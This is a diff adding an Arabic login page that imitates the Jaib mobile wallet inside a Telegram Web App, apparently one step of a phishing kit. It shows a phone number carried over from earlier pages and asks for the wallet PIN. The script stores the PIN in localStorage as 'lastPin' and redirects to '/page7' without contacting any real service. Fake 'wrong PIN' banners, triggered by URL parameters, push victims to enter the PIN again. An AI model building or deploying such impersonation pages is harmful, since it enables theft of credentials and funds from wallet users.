@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول - جيب (Jaib)</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!-- ✅ Arabic Font (Tajawal) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --jaib-red: #E31C24;
+            --jaib-red-dark: #B81118;
+            --jaib-dark: #18181B;
+            --bg-light: #F6F6F7;
+            --card-bg: #FFFFFF;
+            --text-main: #111111;
+            --text-muted: #6B7280;
+            --border-light: #E2E5E9;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-light);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        /* Subtle Top Pattern Header like Jaib App */
+        .top-header {
+            width: 100%;
+            background:
+                radial-gradient(circle at 20% 25%, rgba(227, 28, 36, 0.05) 0%, transparent 55%),
+                linear-gradient(180deg, #ECECEE 0%, #F6F6F7 100%);
+            padding: 22px 20px 14px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+
+        .brand-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .brand-logo-top {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .brand-arabic {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--jaib-red);
+            line-height: 1;
+        }
+
+        .brand-english {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--jaib-red);
+            line-height: 1;
+            letter-spacing: -0.3px;
+        }
+
+        /* Main Form Container */
+        .main-content {
+            width: 100%;
+            max-width: 420px;
+            margin: 8px auto 0;
+            padding: 0 20px 30px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .welcome-title {
+            font-size: 28px;
+            font-weight: 900;
+            color: var(--text-main);
+            margin: 0 0 4px;
+            line-height: 1.25;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-muted);
+            margin: 0 0 24px;
+            line-height: 1.4;
+        }
+
+        /* 🚨 Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #FFF1F2;
+            border: 1.5px solid #FDA4AF;
+            color: #BE123C;
+            padding: 12px 14px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 18px;
+            display: none;
+            text-align: right;
+        }
+
+        /* Input Fields Matching Jaib Screen */
+        .input-group {
+            width: 100%;
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        .mobile-box {
+            width: 100%;
+            background-color: var(--card-bg);
+            border: 1.5px solid var(--border-light);
+            border-radius: 14px;
+            padding: 15px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+        }
+
+        .mobile-number-wrap {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            direction: ltr;
+            font-size: 17px;
+            font-weight: 800;
+            color: var(--text-main);
+        }
+
+        .flag-badge {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .field-tag {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-muted);
+        }
+
+        .password-box {
+            width: 100%;
+            background-color: var(--card-bg);
+            border: 1.5px solid var(--border-light);
+            border-radius: 14px;
+            padding: 4px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+        }
+
+        .password-box:focus-within {
+            border-color: var(--jaib-red);
+            box-shadow: 0 0 0 3px rgba(227, 28, 36, 0.08);
+        }
+
+        .password-box.input-error {
+            border-color: #E11D48;
+            background-color: #FFF5F6;
+        }
+
+        .password-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            outline: none;
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--text-main);
+            padding: 12px 2px;
+            letter-spacing: 2px;
+            width: 100%;
+        }
+
+        .password-input::placeholder {
+            font-size: 15px;
+            font-weight: 500;
+            color: #9CA3AF;
+            letter-spacing: 0;
+        }
+
+        .toggle-eye {
+            cursor: pointer;
+            font-size: 20px;
+            user-select: none;
+            color: var(--text-muted);
+            padding: 6px;
+            background: none;
+            border: none;
+        }
+
+        .forgot-password {
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 700;
+            text-decoration: none;
+            margin: 6px 2px 24px;
+            display: inline-block;
+            align-self: flex-start;
+        }
+
+        .forgot-password:hover {
+            color: var(--jaib-red);
+        }
+
+        /* Login Button - Hidden until first digit is typed */
+        .btn-login {
+            display: none;
+            width: 100%;
+            background-color: var(--jaib-red);
+            color: #FFFFFF;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 6px 16px rgba(227, 28, 36, 0.28);
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .btn-login.visible {
+            display: block;
+        }
+
+        .btn-login:hover {
+            background-color: var(--jaib-red-dark);
+        }
+
+        .btn-login:active {
+            transform: scale(0.99);
+        }
+
+        /* Bottom Footer */
+        .footer-box {
+            width: 100%;
+            text-align: center;
+            padding: 18px 20px 24px;
+            color: var(--text-muted);
+            font-size: 12px;
+            margin-top: auto;
+        }
+
+        .terms-text {
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 600;
+        }
+
+        .terms-text u {
+            color: var(--jaib-red);
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Top Header with Jaib Branding -->
+<div class="top-header">
+    <div class="brand-logo">
+        <div class="brand-logo-top">
+            <svg width="26" height="24" viewBox="0 0 28 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M2 5H7.5M10.5 5H24V13.5C24 18.7467 19.7467 23 14.5 23C9.25329 23 5 18.7467 5 13.5V11" stroke="#E31C24" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/>
+                <circle cx="11.5" cy="11.5" r="2.6" fill="#E31C24"/>
+            </svg>
+            <span class="brand-arabic">جيب</span>
+        </div>
+        <span class="brand-english">Jaib</span>
+    </div>
+</div>
+
+<!-- Main Login Form -->
+<div class="main-content">
+    <h1 class="welcome-title">مرحباً بك في جيب</h1>
+    <p class="subtitle">سجّل الدخول للمتابعة • أدخل كلمة المرور</p>
+
+    <!-- Error Banner -->
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <!-- Mobile Field Showing Number Entered in Previous Pages -->
+    <div class="input-group">
+        <span class="field-label">رقم الجوال (Mobile)</span>
+        <div class="mobile-box">
+            <div class="mobile-number-wrap">
+                <span class="flag-badge">🇾🇪</span>
+                <span>+967</span>
+                <span id="displayPhone">--</span>
+            </div>
+            <span class="field-tag">الجوال</span>
+        </div>
+    </div>
+
+    <!-- Password Field (Unlimited Digits) -->
+    <div class="input-group">
+        <label for="passwordInput" class="field-label">كلمة المرور (Password) — يرجى إدخال كلمة المرور</label>
+        <div class="password-box" id="passwordBox">
+            <input
+                type="password"
+                id="passwordInput"
+                class="password-input"
+                placeholder="أدخل كلمة المرور..."
+                inputmode="numeric"
+                pattern="[0-9]*"
+                autocomplete="off"
+            >
+            <button type="button" class="toggle-eye" id="eyeIcon" aria-label="إظهار أو إخفاء كلمة المرور">👁️‍🗨️</button>
+        </div>
+    </div>
+
+    <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+
+    <!-- Login Button (Appears after entering first digit) -->
+    <button type="button" id="loginBtn" class="btn-login">تسجيل الدخول</button>
+</div>
+
+<!-- Bottom Footer -->
+<div class="footer-box">
+    <p class="terms-text">بتسجيل الدخول، فإنك توافق على <u>الشروط والأحكام</u> • © 2026 محفظة جيب (Jaib)</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const passwordInput = document.getElementById('passwordInput');
+    const passwordBox = document.getElementById('passwordBox');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    // Retrieve saved phone from previous steps (localStorage)
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "771234567";
+    displayPhone.textContent = savedPhone;
+
+    // Detect error parameter in URL query
+    const urlParams = new URLSearchParams(window.location.search);
+    const errParam = urlParams.get('error');
+
+    if (errParam === 'wrong_pin' || errParam === 'wrongpin') {
+        errorDisplay.textContent = "رمز PIN أو كلمة المرور غير صحيحة. يرجى إدخال كلمة المرور الصحيحة.";
+        errorDisplay.style.display = "block";
+        passwordBox.classList.add('input-error');
+        passwordInput.focus();
+    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
+        errorDisplay.textContent = "البيانات المدخلة غير صحيحة. يرجى التحقق والمحاولة مرة أخرى.";
+        errorDisplay.style.display = "block";
+        passwordBox.classList.add('input-error');
+        passwordInput.focus();
+    }
+
+    function updateLoginButtonVisibility() {
+        const hasDigit = passwordInput.value.length >= 1;
+        loginBtn.classList.toggle('visible', hasDigit);
+    }
+
+    passwordInput.addEventListener('input', () => {
+        // Allow numeric digits only with no length restriction (4, 6, or more)
+        passwordInput.value = passwordInput.value.replace(/\D/g, '');
+
+        passwordBox.classList.remove('input-error');
+        errorDisplay.style.display = "none";
+
+        updateLoginButtonVisibility();
+    });
+
+    eye.addEventListener('click', () => {
+        const isPassword = passwordInput.type === "password";
+        passwordInput.type = isPassword ? "text" : "password";
+    });
+
+    loginBtn.addEventListener('click', () => {
+        const pin = passwordInput.value.trim();
+        if (pin.length < 1) return;
+
+        loginBtn.disabled = true;
+        localStorage.setItem('lastPin', pin);
+
+        errorDisplay.style.display = "none";
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
